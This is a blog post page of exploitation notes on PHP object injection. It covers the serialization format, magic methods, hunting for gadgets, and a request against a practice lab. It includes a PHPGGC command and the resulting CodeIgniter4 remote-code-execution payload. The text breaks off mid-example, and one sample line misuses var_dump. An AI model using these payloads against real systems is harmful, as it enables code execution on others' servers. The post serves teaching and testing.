<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="light"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="PHP Object Injection Exploitation Notes" />
<meta property="og:locale" content="en" />
<meta name="description" content="Notes I‚Äôve written and Collected about PHP Deserialization" />
<meta property="og:description" content="Notes I‚Äôve written and Collected about PHP Deserialization" />
<link rel="canonical" href="http://localhost:4000/posts/02_php_object_injection_exploitation-notes/" />
<meta property="og:url" content="http://localhost:4000/posts/02_php_object_injection_exploitation-notes/" />
<meta property="og:site_name" content="üíª Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-01-09T03:25:52+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="PHP Object Injection Exploitation Notes" />
<meta name="twitter:site" content="@snoopysecurity" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-01-09T03:25:52+08:00","datePublished":"2021-01-09T03:25:52+08:00","description":"Notes I‚Äôve written and Collected about PHP Deserialization","headline":"PHP Object Injection Exploitation Notes","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/02_php_object_injection_exploitation-notes/"},"url":"http://localhost:4000/posts/02_php_object_injection_exploitation-notes/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>PHP Object Injection Exploitation Notes | üíª | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="üíª | Blog">
<meta name="application-name" content="üíª | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/blog/pic1.jpeg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">üíª | Blog</a>
    </div>
    <div class="site-subtitle font-italic">learning security while segfaulting through life</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/snoopysecurity" aria-label="github"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/snoopysecurity" aria-label="twitter"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')" aria-label="email"
        
        

        

        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        

        

        >
        <i class="fas fa-rss"></i>
      </a>
      

    
      

      
      <a href="" aria-label="linkedin"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-linkedin"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>PHP Object Injection Exploitation Notes</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      

    
      

      
      
      

      

    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    <!-- make sure the `<img>` is wrapped by `<a>` -->
    

    
      <!-- create the image wrapper -->
      
    

    <!-- combine -->
    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    

    

  

  
  

  




<!-- return -->

<h1 data-toc-skip>PHP Object Injection Exploitation Notes</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1610133952"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jan  9, 2021
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/snoopysecurity">Sam Sanoop</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2915 words">
  <em>16 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p><strong>Notes I‚Äôve written and Collected about PHP Deserialization</strong></p>

<h3 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="serialize-and-unserialize"><span class="mr-2">serialize and unserialize</span><a href="#serialize-and-unserialize" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Serialization functions are commonly used within software to store data to a file, a memory buffer, or transmitted across to another network which can then be deserialized at a later date. Within PHP, The serialize() function can be used to convert a value to an serialized object. This function can be used to convert a value/object to a serialized value. An example of this can be seen below:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">Test</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">"Snoopy"</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mf">0.1</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$hobbies</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"bughunting"</span><span class="p">,</span> <span class="s2">"softwaresecurity"</span><span class="p">);</span>
    <span class="k">public</span> <span class="nv">$bug_hunter</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Test</span><span class="p">();</span>
<span class="nv">$serialized</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$serialized</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The serialized form of the above object can be seen as</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"Test"</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"name"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"Snoopy"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">"age"</span><span class="p">;</span><span class="n">d</span><span class="o">:</span><span class="mf">0.1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"secret"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"hobbies"</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"bughunting"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">16</span><span class="o">:</span><span class="s2">"softwaresecurity"</span><span class="p">;}</span><span class="n">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"bug_hunter"</span><span class="p">;</span><span class="n">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This structure can be understood as:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">O:Length of Object name :‚ÄùClass Name‚Äù:Number of Properties in Class:{Properties}</code> - <code class="language-plaintext highlighter-rouge">O:4:"Test":5</code></li>
  <li>{ data } - Denotes the data structure of the object with the 5 properties - <code class="language-plaintext highlighter-rouge">$name, $age, $secret, $hobbies, $bug_hunter</code></li>
  <li><code class="language-plaintext highlighter-rouge">s:Length of the String:‚ÄùString Value‚Äù;</code> - <code class="language-plaintext highlighter-rouge">s:4:"name";s:6:"Snoopy";</code></li>
  <li><code class="language-plaintext highlighter-rouge">d:Float;</code> - s:3:‚Äùage‚Äù;d:0.1;`</li>
  <li><code class="language-plaintext highlighter-rouge">i:Integer;</code> - <code class="language-plaintext highlighter-rouge">s:6:"secret";i:0;</code></li>
  <li><code class="language-plaintext highlighter-rouge">a:Number of Elements:{Elements}</code> - <code class="language-plaintext highlighter-rouge">a:2:{i:0;s:10:"bughunting";i:1;s:16:"softwaresecurity";}</code></li>
  <li><code class="language-plaintext highlighter-rouge">b:boolean;</code> - <code class="language-plaintext highlighter-rouge">s:10:"bug_hunter";b:1;</code></li>
</ul>

<p>This can be converted back to an object from using the <a href="https://www.php.net/manual/en/function.unserialize.php">unserialize()</a> function. unserialize has two parameters:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">unserialize</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$data</span> <span class="p">,</span> <span class="k">array</span> <span class="nv">$options</span> <span class="o">=</span> <span class="p">[]</span> <span class="p">)</span> <span class="o">:</span> <span class="n">mixed</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">$data</code> parameter takes a serialized string that can be deserialized</li>
  <li>The <code class="language-plaintext highlighter-rouge">$options</code> array can be used to specify allowed_classes. allowed_classes can be used to whitelist class names that should be accepted. If this is used and <code class="language-plaintext highlighter-rouge">unserialize()</code> encounters an object of a class that isn‚Äôt to be accepted, then the object will be instantiated as a __PHP_Incomplete_Class instead.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="nv">$object</span> <span class="o">=</span> <span class="s1">'O:4:"Test":5:{s:4:"name";s:6:"Snoopy";s:3:"age";d:0.1;s:6:"secret";i:0;s:7:"hobbies";a:2:{i:0;s:10:"bughunting";i:1;s:16:"softwaresecurity";}s:10:"bug_hunter";b:1;}'</span><span class="p">;</span>
<span class="nv">$unserialized</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$object</span><span class="p">));</span>
<span class="k">echo</span> <span class="nv">$unserialized</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>During deserialization, <code class="language-plaintext highlighter-rouge">unserialize</code> will take the user input, this input will have some objects along with the class and the properties of that object, and will create an instance of the provided class and object in memory (Object Instantiation) and creates a copy of the originally serialized object. As per PHP documentation, after successfully reconstructing the object, PHP will automatically attempt to call the the __wakeup() magic method as well (if one exists) and execute code in that function if it is defined for the class. This function can reconstruct any resources that the object may have. The intended use of <code class="language-plaintext highlighter-rouge">__wakeup()</code> is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. Once this is done, then the <code class="language-plaintext highlighter-rouge">__destruct()</code> magic method of that class will be called to when no reference to the deserialized object instance exists.</p>

<p><code class="language-plaintext highlighter-rouge">serialize()</code> will save all properties in the object and the class the object belongs to during serialization but no methods of the class of the object will be stored. As such, when unserialize is triggered, the class of the object will have to be defined in advance in code (definition of the class needs to be present in the file unserialize() is called in), or through autoloading. If the class is not already defined in the file, the object will be instantiated as <code class="language-plaintext highlighter-rouge">__PHP_Incomplete_Class</code>, which has no methods.</p>

<h3 id="object-injection"><span class="mr-2">Object Injection</span><a href="#object-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>PHP Object Injection/Unserialization happens when untrusted user input is being executed by the <code class="language-plaintext highlighter-rouge">unserialize</code> function which can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.</p>

<p>This was initially made public by Stefan Esser</p>

<ul>
  <li>https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf</li>
  <li>https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf</li>
  <li>https://wiki.php.net/rfc/secure_unserialize</li>
</ul>

<h3 id="requirements-for-a-successful-exploit"><span class="mr-2">Requirements for a Successful Exploit</span><a href="#requirements-for-a-successful-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>PHP Magic Methods - The codebase/application being exploited needs to have interesting magic methods that can then be triggered through a POP chain.</li>
  <li>The POP gadget chain/object being called must be declared during when unserialize is being called ( include() or require()) or object autoloading (through composer (require <strong>DIR</strong> . <code class="language-plaintext highlighter-rouge">'/vendor/autoload.php';</code>) or generic autoloading) must be supported for the target classes when unserialize() is being executed</li>
</ul>

<h3 id="php-magic-methods"><span class="mr-2">PHP Magic Methods</span><a href="#php-magic-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>PHP Magic Methods are PHP classes that have magical properties in PHP. You cannot have functions with these names in any of your classes unless you want the magic functionality associated with them. More about this can be read from here: <a href="https://www.php.net/manual/en/language.oop5.magic.php">PHP Magic Methods</a> Documentation. During exploitation, these magic methods can be invoked by crafting a PHP POP gadget. This is because these methods are executed automatically when unserialize() is called on an object.</p>

<p>Magic Methods most useful for exploitation</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">__toString()</code> - Invoked when object is converted to a string. (by echo for example)</li>
  <li><code class="language-plaintext highlighter-rouge">__destruct()</code> - Invoked when an object is deleted. When no reference to the deserialized object instance exists, __destruct() is called.</li>
  <li><code class="language-plaintext highlighter-rouge">__wakeup()</code>	- Invoked when an object is unserialized. automatically called upon object deserialization.</li>
  <li><code class="language-plaintext highlighter-rouge">__call()</code> - will be called if the object will ca1ll an inexistent function</li>
</ul>

<p>Magic Methods that could be useful for exploitation (Not useful in Most Cases)</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">__set()</code> - called if the object try to access inexistent class variables</li>
  <li><code class="language-plaintext highlighter-rouge">__isset()</code></li>
  <li><code class="language-plaintext highlighter-rouge">__invoke()</code></li>
  <li><code class="language-plaintext highlighter-rouge">__unset()</code></li>
  <li><code class="language-plaintext highlighter-rouge">__set_state()</code></li>
  <li><code class="language-plaintext highlighter-rouge">__callStatic()</code></li>
  <li><code class="language-plaintext highlighter-rouge">__sleep()</code> - called when an object is serialized (with serialize)</li>
  <li><code class="language-plaintext highlighter-rouge">__clone()</code></li>
  <li><code class="language-plaintext highlighter-rouge">__get()</code>	- called if the object try to access inexistent class variables</li>
  <li>` __debugInfo()`</li>
  <li><code class="language-plaintext highlighter-rouge">__construct()</code> - Invoked when an object is created (constructor)</li>
</ul>

<h3 id="phpgcc"><span class="mr-2">PHPGCC</span><a href="#phpgcc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>PHPGGC is a library of unserialize() payloads along with a command-line program. This can be used to generate POP gadgets from known libraries people have already found. PHPGGC supports gadget chains such as CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, WordPress, Yii, and ZendFramework.</p>

<ul>
  <li>List all gadgets</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                        TYPE             VECTOR         I    
CodeIgniter4/RCE1                         4.0.0-beta.1 &lt;= 4.0.0-rc.4     rce              __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.0.4+           rce              __destruct          
Doctrine/FW1                              ?                              file_write       __toString     *    
Drupal7/FD1                               7.0 &lt; ?                        file_delete      __destruct     *    
Drupal7/RCE1                              7.0.8 &lt; ?                      rce              __destruct     *  
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Create a POP gadget using the <code class="language-plaintext highlighter-rouge">__destruct</code> vector known in versions <code class="language-plaintext highlighter-rouge">4.0.0-rc.4 &lt;= 4.0.4+</code>. Run the system command id using PHP‚Äôs system function.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>     

./phpggc CodeIgniter4/RCE2 system id


O:39:"CodeIgniter\Cache\Handlers\RedisHandler":1:{s:8:"*redis";O:45:"CodeIgniter\Session\Handlers\MemcachedHandler":2:{s:12:"*memcached";O:17:"CodeIgniter\Model":8:{s:10:"*builder";O:32:"CodeIgniter\Database\BaseBuilder":2:{s:6:"QBFrom";a:1:{i:0;s:2:"()";}s:2:"db";O:38:"CodeIgniter\Database\MySQLi\Connection":0:{}}s:13:"*primaryKey";N;s:15:"*beforeDelete";a:1:{i:0;s:8:"validate";}s:18:"*validationRules";a:1:{s:4:"id.x";a:1:{s:5:"rules";a:2:{i:0;s:6:"system";i:1;s:2:"dd";}}}s:13:"*validation";O:33:"CodeIgniter\Validation\Validation":1:{s:15:"*ruleSetFiles";a:1:{i:0;s:5:"finfo";}}s:21:"*tempAllowCallbacks";i:1;s:2:"db";O:38:"CodeIgniter\Database\MySQLi\Connection":0:{}s:20:"cleanValidationRules";b:0;}s:10:"*lockKey";a:1:{s:1:"x";s:2:"id";}}}
</pre></td></tr></tbody></table></code></div></div>

<h3 id="hunting-for-pop-gadgets"><span class="mr-2">Hunting For POP Gadgets</span><a href="#hunting-for-pop-gadgets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Examples of interesting functionalities to look for within Magic Methods:</p>

<ul>
  <li>Arbritary File Write - <code class="language-plaintext highlighter-rouge">@unlink($fileobject)</code>, <code class="language-plaintext highlighter-rouge">file_put_contents($this-&gt;file)</code></li>
  <li>Code Execution - <code class="language-plaintext highlighter-rouge">eval($this-&gt;injectobject)</code>;</li>
  <li>Type Juggling - if <code class="language-plaintext highlighter-rouge">($username == $adminName &amp;&amp; $password == $adminPassword) { ( loose comparison operator ‚Äú==‚Äù,</code>‚àÇ user input taken as arrays and type conversion occurs )</li>
  <li>Authentication Bypass through Object reference - if (isset<code class="language-plaintext highlighter-rouge">($this-&gt;obj))</code> return <code class="language-plaintext highlighter-rouge">$this-&gt;obj-&gt;getValue();, ($obj-&gt;check === $obj-&gt;secrethash) {echo "Pass"</code>;</li>
  <li>SQL Injection - $sql = <code class="language-plaintext highlighter-rouge">"SELECT * FROM table WHERE id = " . $id;</code></li>
</ul>

<p>Other Dangerous functions that might be useful to look for:</p>

<ul>
  <li>Dangerous PHP Functions - https://gist.github.com/snoopysecurity/7afd189724bc02a14a7f89d9a8284b69</li>
  <li>DangerousPHPFunctions - https://github.com/v-p-b/DangerousPHPFunctions</li>
</ul>

<p>When checking projects, git clone and execute composer install to install all dependencies, this can then be reviewed for useful POP gadget.</p>

<p><strong>Example (https://github.com/weev3/LKWA) Object Injection</strong></p>

<p><a href="/assets/img/blog/appsec/php1.png" class="popup img-link "><img data-src="/assets/img/blog/appsec/php1.png" alt="" class="lazyload" data-proofer-ignore></a></p>

<p>The following request is submitted by the application http://lkwa.local:3000/objectInjection/content.php</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>GET /objectInjection/content.php?object=O:8:%22stdClass%22:2:{s:4:%22data%22;s:9:%22Hey%20Dude!%22;s:4:%22text%22;s:26:%22upload%20shell%20if%20you%20can!!!%22;} HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://lkwa.local:3000/objectInjection/content.php
Upgrade-Insecure-Requests: 1
</pre></td></tr></tbody></table></code></div></div>

<p>The following code is used server-side to unserialize the object.</p>

<p>https://github.com/weev3/LKWA/blob/master/objectInjection/content.php#L40</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
